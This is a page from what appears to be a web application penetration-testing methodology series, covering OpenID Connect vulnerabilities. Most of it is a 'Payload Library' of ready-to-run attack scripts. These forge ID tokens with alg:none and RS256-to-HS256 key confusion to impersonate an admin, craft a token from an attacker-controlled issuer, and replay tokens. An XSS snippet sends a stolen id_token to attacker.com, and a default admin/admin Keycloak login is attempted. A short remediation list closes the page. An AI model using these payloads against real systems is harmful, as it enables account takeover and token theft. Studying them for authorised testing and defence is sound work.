---
title: "OpenID Connect (OIDC) Vulnerabilities"
date: 2026-02-24
draft: false
---

# OpenID Connect (OIDC) Vulnerabilities

> **Severity**: High–Critical | **CWE**: CWE-287, CWE-346
> **OWASP**: A07:2021 – Identification and Authentication Failures | A01:2021 – Broken Access Control

---

## What Is OIDC?

OpenID Connect (OIDC) is an identity layer built on top of OAuth 2.0. While OAuth handles authorization (who can access what), OIDC handles authentication (who the user is). It introduces the **ID Token** — a JWT containing identity claims — and the `UserInfo` endpoint for additional claims.

Attack surface extends OAuth 2.0 vulnerabilities with OIDC-specific issues:
- **Nonce replay**: ID token nonce not validated → token replay attack
- **Token substitution**: access token used as ID token (different validation rules)
- **Hybrid flow attacks**: mixing code + token in same response creates attack surface
- **PKCE downgrade**: forcing plain code challenge or removing PKCE entirely
- **Claims injection**: manipulating `sub`, `aud`, `iss` claims if signature not verified
- **Discovery document poisoning**: `/.well-known/openid-configuration` manipulation

---

## Discovery Checklist

**Phase 1 — Enumerate OIDC Configuration**
- [ ] Fetch `/.well-known/openid-configuration` — lists all supported flows, endpoints, algorithms
- [ ] Identify supported response_types: `code`, `token`, `id_token`, `code id_token`, `code token`
- [ ] Identify supported algorithms: RS256, HS256, PS256 — check for `none` or weak algos
- [ ] Check JWKS endpoint for public keys
- [ ] Identify nonce support: is it required? Validated server-side?

**Phase 2 — Flow Analysis**
- [ ] Identify which flows the application uses (check authorization URL parameters)
- [ ] Does app validate `nonce` in ID token vs session nonce?
- [ ] Does app validate `aud` claim against its own client_id?
- [ ] Does app validate `iss` claim against the correct provider?
- [ ] Does app validate token signature (or trust unverified claims)?

**Phase 3 — Attack Chain Construction**
- [ ] Nonce missing → can replay ID token across sessions
- [ ] `alg:none` accepted → forge claims without signature
- [ ] `iss` not validated → inject ID token from attacker-controlled provider
- [ ] `sub` substitution → use own ID token to impersonate victim (if sub=email)
- [ ] Hybrid flow → intercept fragment-delivered tokens before redirect

---

## Payload Library

### Payload 1 — OIDC Discovery Document Enumeration

```bash
# Fetch OIDC discovery document:
TARGET="https://accounts.target.com"
curl -s "$TARGET/.well-known/openid-configuration" | python3 -m json.tool

# Key fields to note:
python3 << 'EOF'
import requests, json

provider = "https://accounts.target.com"
config = requests.get(f"{provider}/.well-known/openid-configuration").json()

print("[*] Issuer:", config.get("issuer"))
print("[*] Auth endpoint:", config.get("authorization_endpoint"))
print("[*] Token endpoint:", config.get("token_endpoint"))
print("[*] UserInfo endpoint:", config.get("userinfo_endpoint"))
print("[*] JWKS URI:", config.get("jwks_uri"))
print("[*] Response types:", config.get("response_types_supported"))
print("[*] Grant types:", config.get("grant_types_supported"))
print("[*] ID Token signing algos:", config.get("id_token_signing_alg_values_supported"))
print("[*] Token endpoint auth methods:", config.get("token_endpoint_auth_methods_supported"))

# Check for dangerous support:
if "none" in str(config.get("id_token_signing_alg_values_supported", [])):
    print("[!!!] ALG:NONE SUPPORTED!")
if "code token" in str(config.get("response_types_supported", [])):
    print("[!] Hybrid flow (code+token) supported — review token handling")
if not config.get("require_pkce", False):
    print("[!] PKCE not required per discovery doc — test downgrade")

# Fetch JWKS:
jwks = requests.get(config.get("jwks_uri", "")).json()
for key in jwks.get("keys", []):
    print(f"[Key] kid={key.get('kid')}, kty={key.get('kty')}, alg={key.get('alg')}")
EOF

# Check for exposed UserInfo endpoint (may reveal PII without auth):
curl -s "https://accounts.target.com/userinfo" | python3 -m json.tool
# Should require Authorization: Bearer access_token
# If not → information disclosure
```

### Payload 2 — Nonce Validation Bypass

```python
#!/usr/bin/env python3
"""
Test nonce validation in OIDC ID tokens
"""
import requests, secrets, base64, json, urllib.parse

CLIENT_ID = "CLIENT_ID_HERE"
REDIRECT_URI = "https://app.target.com/callback"
AUTH_ENDPOINT = "https://accounts.target.com/authorize"
TOKEN_ENDPOINT = "https://accounts.target.com/token"
CLIENT_SECRET = "CLIENT_SECRET_HERE"

# Step 1: Generate authorization URL WITHOUT nonce:
params = {
    "response_type": "code",
    "client_id": CLIENT_ID,
    "redirect_uri": REDIRECT_URI,
    "scope": "openid profile email",
    # "nonce": "REQUIRED_NONCE",  # Intentionally omitted
    "state": secrets.token_urlsafe(16),
}
auth_url = AUTH_ENDPOINT + "?" + urllib.parse.urlencode(params)
print(f"[*] Auth URL (no nonce): {auth_url}")

# Step 2: Complete auth flow (get code from redirect)
# Simulate: exchange code for tokens
auth_code = "CODE_FROM_REDIRECT"

token_response = requests.post(TOKEN_ENDPOINT, data={
    "grant_type": "authorization_code",
    "code": auth_code,
    "redirect_uri": REDIRECT_URI,
    "client_id": CLIENT_ID,
    "client_secret": CLIENT_SECRET,
})

tokens = token_response.json()
id_token = tokens.get("id_token", "")

# Decode ID token (without verifying signature):
def decode_jwt_payload(token):
    payload = token.split(".")[1]
    padding = 4 - len(payload) % 4
    return json.loads(base64.urlsafe_b64decode(payload + "=" * padding))

claims = decode_jwt_payload(id_token)
print(f"[*] ID token claims: {json.dumps(claims, indent=2)}")

# Check nonce in claims:
if "nonce" not in claims:
    print("[!!!] NO NONCE IN ID TOKEN — replay attack possible!")
    print("      Any captured ID token from another session can be reused")
elif claims["nonce"] == "":
    print("[!!!] EMPTY NONCE — likely not validated")

# Step 3: Test token replay — use the same ID token in another session:
# (In practice: session 1 gets token, session 2 uses same token)
print(f"\n[*] Replay test: use this ID token in a different session:")
print(f"    id_token={id_token[:60]}...")
```

### Payload 3 — ID Token Signature Bypass (alg:none, RS256→HS256)

```python
#!/usr/bin/env python3
"""
OIDC ID token signature manipulation
"""
import base64, json, hmac, hashlib, requests

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64url_decode(s):
    padding = 4 - len(s) % 4
    return base64.urlsafe_b64decode(s + "=" * padding)

# Capture a legitimate ID token:
CAPTURED_TOKEN = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjEyMyJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiZW1haWwiOiJ1c2VyQHRhcmdldC5jb20iLCJhdWQiOiJDTElFTlRfSUQiLCJpc3MiOiJodHRwczovL2FjY291bnRzLnRhcmdldC5jb20iLCJleHAiOjk5OTk5OTk5OTksImlhdCI6MTYwMDAwMDAwMH0.INVALID_SIG"

# Attack 1: alg:none
header_orig = json.loads(b64url_decode(CAPTURED_TOKEN.split(".")[0]))
payload_orig = json.loads(b64url_decode(CAPTURED_TOKEN.split(".")[1]))

# Modify claims:
payload_modified = dict(payload_orig)
payload_modified["sub"] = "ADMIN_USER_ID"
payload_modified["email"] = "admin@target.com"
payload_modified["exp"] = 9999999999  # far future

# Create alg:none token:
header_none = {"alg": "none", "typ": "JWT"}
alg_none_variants = [
    {"alg": "none"},
    {"alg": "None"},
    {"alg": "NONE"},
    {"alg": "nOnE"},
    {"alg": ""},
]

for header_variant in alg_none_variants:
    token = (b64url_encode(json.dumps(header_variant)) + "." +
             b64url_encode(json.dumps(payload_modified)) + ".")
    print(f"[alg:{header_variant['alg']}] {token[:80]}...")

# Attack 2: RS256 → HS256 key confusion
# If server accepts HS256 and uses the RSA public key as HMAC secret:
def get_jwks_public_key_pem(jwks_uri):
    """Fetch RS256 public key from JWKS and return PEM"""
    import jwt  # pip3 install PyJWT[crypto]
    from jwt.algorithms import RSAAlgorithm
    jwks = requests.get(jwks_uri).json()
    for key in jwks["keys"]:
        if key["kty"] == "RSA":
            return RSAAlgorithm.from_jwk(json.dumps(key))
    return None

# Using PyJWT with RS256 public key as HS256 secret:
try:
    import jwt
    # Fetch public key:
    JWKS_URI = "https://accounts.target.com/.well-known/jwks.json"
    public_key_pem = get_jwks_public_key_pem(JWKS_URI)
    if public_key_pem:
        # Sign modified payload with public key as HMAC secret:
        token_hs256 = jwt.encode(
            payload_modified,
            public_key_pem,
            algorithm="HS256"
        )
        print(f"\n[RS256→HS256] {token_hs256[:80]}...")
except ImportError:
    print("[*] Install PyJWT[crypto]: pip3 install PyJWT cryptography")
```

### Payload 4 — Issuer and Audience Claim Manipulation

```python
#!/usr/bin/env python3
"""
Test iss/aud validation in OIDC implementations
"""
import jwt, json, requests

# Scenario: Attacker controls an OIDC provider
# If client doesn't validate 'iss' claim, attacker can forge identity

ATTACKER_ISS = "https://evil.com"
VICTIM_CLIENT_ID = "TARGET_APP_CLIENT_ID"
VICTIM_SUBJECT = "admin_user_sub"

# Create a legitimate-looking ID token from attacker's provider:
# (Attacker signs with their own private key)
import datetime

payload = {
    "iss": ATTACKER_ISS,        # attacker's issuer
    "sub": VICTIM_SUBJECT,       # victim's subject
    "aud": VICTIM_CLIENT_ID,     # target's client_id
    "iat": int(datetime.datetime.now().timestamp()),
    "exp": int((datetime.datetime.now() + datetime.timedelta(hours=1)).timestamp()),
    "email": "admin@target.com",
    "email_verified": True,
    "nonce": "any_nonce",
}

# If attacker's JWKS is also accessible and client fetches JWKS dynamically:
# Attacker's /.well-known/openid-configuration points to attacker's JWKS
# → Client fetches and trusts attacker's public key
# → Attacker's signed token passes signature validation

print("[*] Forged ID token payload:")
print(json.dumps(payload, indent=2))

# Audience bypass: token issued to different client reused at target:
# If aud validation is weak:
payload_aud_bypass = dict(payload)
payload_aud_bypass["aud"] = [VICTIM_CLIENT_ID, "other_app_client_id"]
# If server accepts "aud contains client_id" → multi-audience token works

# Sub claim confusion: if different apps map sub to accounts differently:
# App 1: sub=user@domain.com (email as sub)
# App 2: links sub=user@domain.com to admin account
# → Token from App 1's flow used in App 2 → privilege escalation

# Test: get ID token for YOUR account, use it at another endpoint:
# If both apps share same IDP but different client_ids:
# → Some apps don't properly validate aud claim
# → Your token (aud=app1_client) accepted at app2
```

### Payload 5 — Hybrid Flow Token Interception

```bash
# Hybrid flow: response_type=code id_token
# ID token delivered in URL fragment → JavaScript reads it
# → XSS can steal fragment-delivered token

# Test if hybrid flow is used:
curl -v "https://accounts.target.com/authorize?\
response_type=code%20id_token&\
client_id=CLIENT_ID&\
redirect_uri=https://app.target.com/callback&\
scope=openid%20profile&\
nonce=REQUIRED_FOR_HYBRID&\
state=RANDOM" 2>&1 | grep "location"

# Hybrid response delivers token in fragment:
# https://app.target.com/callback#code=AUTH_CODE&id_token=eyJ...&state=...

# XSS to steal fragment-based ID token:
# If target app has XSS, inject:
<script>
// Steal fragment-delivered token from redirect page:
if (window.location.hash.includes('id_token')) {
    var params = new URLSearchParams(window.location.hash.slice(1));
    var token = params.get('id_token');
    fetch('https://attacker.com/steal?t=' + encodeURIComponent(token));
}
</script>

# OAuth token substitution: use access_token as id_token:
# Some implementations accept the access_token in the id_token field
# → Different validation rules apply
# Test by swapping id_token and access_token values in callback:
curl "https://app.target.com/callback" \
  -X POST \
  -d "code=AUTH_CODE&id_token=ACCESS_TOKEN_VALUE&state=STATE"

# PKCE downgrade test:
# Try without code_challenge in authorization request:
curl -v "https://accounts.target.com/authorize?\
response_type=code&\
client_id=CLIENT_ID&\
redirect_uri=https://app.target.com/callback&\
scope=openid&\
state=RANDOM" 2>&1 | grep -i "error\|location"
# If no error → PKCE not enforced
```

### Payload 6 — UserInfo Endpoint Injection

```bash
# UserInfo endpoint returns claims via access token:
# Test if UserInfo response can be manipulated (SSRF/injection in claims)

# Fetch UserInfo with access token:
ACCESS_TOKEN="YOUR_ACCESS_TOKEN"
curl -s "https://accounts.target.com/userinfo" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | python3 -m json.tool

# If UserInfo endpoint accepts GET with token in URL (insecure):
curl -s "https://accounts.target.com/userinfo?access_token=$ACCESS_TOKEN"
# → access token logged in server access logs → token leakage

# Test if UserInfo respects scope — can you get more than requested?
# Request only 'openid' scope, check if email/profile returned:
# (Over-scoped UserInfo = information disclosure)

# If app trusts UserInfo claims over ID token claims:
# SSRF via profile picture URL (if UserInfo has picture: URL claim):
# Request scope=openid&... → get ID token with picture=URL
# If app fetches picture URL server-side → SSRF

# Token reuse: UserInfo token vs ID token confusion:
# Some implementations accept ID token as bearer in UserInfo endpoint:
curl -s "https://accounts.target.com/userinfo" \
  -H "Authorization: Bearer LEAKED_ID_TOKEN"
```

---

## Tools

```bash
# jwt_tool — JWT and OIDC testing:
git clone https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py ID_TOKEN_HERE -V -jw jwks.json  # verify with JWKS
python3 jwt_tool.py ID_TOKEN_HERE -X a               # alg:none attack
python3 jwt_tool.py ID_TOKEN_HERE -X s               # secret guessing

# oidcscan — automated OIDC vulnerability scanner:
pip3 install oidcscan
oidcscan https://accounts.target.com

# TokenBreaker — OIDC/JWT token analysis:
# Manual JWT decode:
python3 -c "
import sys, base64, json
token = 'YOUR_ID_TOKEN_HERE'
parts = token.split('.')
for i, part in enumerate(['Header', 'Payload']):
    padding = 4 - len(parts[i]) % 4
    decoded = json.loads(base64.urlsafe_b64decode(parts[i] + '='*padding))
    print(f'{part}:', json.dumps(decoded, indent=2))
"

# oauth2-proxy — testing OAuth/OIDC flows:
# Burp Suite — intercept OIDC flows:
# 1. Configure browser proxy
# 2. Start OAuth flow
# 3. Intercept /callback request
# 4. Modify code, state, id_token in response

# Check for provider-side misconfigurations:
# KeyCloak debug endpoints:
curl "https://keycloak.target.com/auth/realms/REALM/.well-known/openid-configuration"
curl "https://keycloak.target.com/auth/realms/master/protocol/openid-connect/token" \
  -d "grant_type=password&client_id=admin-cli&username=admin&password=admin"

# Test PKCE enforcement:
python3 << 'EOF'
import requests, secrets, hashlib, base64

client_id = "CLIENT_ID"
redirect_uri = "https://app.target.com/callback"
auth_endpoint = "https://accounts.target.com/authorize"

# Without PKCE:
params_no_pkce = {"response_type": "code", "client_id": client_id,
                   "redirect_uri": redirect_uri, "scope": "openid", "state": "test"}
print("Without PKCE:", auth_endpoint + "?" + "&".join(f"{k}={v}" for k,v in params_no_pkce.items()))

# With PKCE:
verifier = secrets.token_urlsafe(64)
challenge = base64.urlsafe_b64encode(
    hashlib.sha256(verifier.encode()).digest()
).rstrip(b"=").decode()

params_pkce = {**params_no_pkce, "code_challenge": challenge, "code_challenge_method": "S256"}
print("With PKCE:", auth_endpoint + "?" + "&".join(f"{k}={v}" for k,v in params_pkce.items()))
EOF
```

---

## Remediation Reference

- **Validate all ID token claims**: verify `iss` (matches expected provider), `aud` (matches your client_id exactly), `exp` (not expired), `iat` (reasonable issuance time), `nonce` (matches session nonce)
- **Use established libraries**: never implement OIDC validation manually — use `python-jose`, `PyJWT`, `openid-connect` library for your platform; they handle algorithm verification, clock skew, and jwks rotation
- **Reject `alg:none`**: explicitly whitelist acceptable algorithms — never accept `none` regardless of what the token header says
- **Enforce PKCE**: require PKCE (`code_challenge_method=S256`) for all public clients; reject `plain` method
- **Nonce**: generate a cryptographically random nonce per authentication request; bind it to the user session; reject ID tokens without matching nonce
- **Strict audience validation**: reject ID tokens where `aud` is an array containing your client_id alongside others (multi-audience tokens can be stolen from other services)
- **Fetch JWKS by pinned URI**: only accept JWKS from the URI in your configured issuer's discovery document — do not use `jku` from the token header to fetch signing keys

*Part of the Web Application Penetration Testing Methodology series.*
